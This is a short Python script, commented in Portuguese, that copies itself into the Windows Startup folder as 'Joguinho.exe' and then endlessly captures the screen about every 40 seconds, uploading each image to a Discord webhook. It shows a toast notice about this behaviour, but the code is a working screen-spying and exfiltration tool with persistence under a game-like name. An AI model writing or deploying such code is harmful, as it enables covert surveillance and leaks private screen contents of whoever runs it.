import pyautogui
import requests
import time
import os
import sys
import shutil
from datetime import datetime
from winotify import Notification, audio
import subprocess

# Configurações
DC_WEBHOOK_URL = "URL DO DC AQUI"
INTERVALO_SEGUNDOS = 40

def adicionar_startup():
    app_path = sys.executable
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    startup_exe = os.path.join(startup_folder, 'Joguinho.exe')
    
    if not os.path.exists(startup_exe):
        shutil.copy2(app_path, startup_exe)

adicionar_startup()
def enviar_print_para_discord():
    try:
        screenshot = pyautogui.screenshot()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        
        screenshot.save(filename)
        
        with open(filename, 'rb') as f:
            file_data = {'file': (filename, f)}
            response = requests.post(DC_WEBHOOK_URL, files=file_data)
        
        os.remove(filename)
        time.sleep(INTERVALO_SEGUNDOS)
        
        if response.status_code == 204:
            print(f"[{timestamp}] Print enviado com sucesso!")
        else:
            print(f"Erro ao enviar: {response.status_code}")
            
    except Exception as e:
        print(f"Erro: {e}")
def env1():
    toast = Notification(
        app_id="AVISO",
        title="AVISO",
        msg="Atenção: Este .exe inicia com o sistema e tira prints da tela; para parar, desabilite-o no Gerenciador de Tarefas > Inicialização ou remova o trecho do código que configura a inicialização automática."
        )
    toast.set_audio(audio.Mail, loop=False)
    toast.add_actions(label="Clique Aqui para Fechar.")
    toast.show()

env1()

while True:
    enviar_print_para_discord()

       
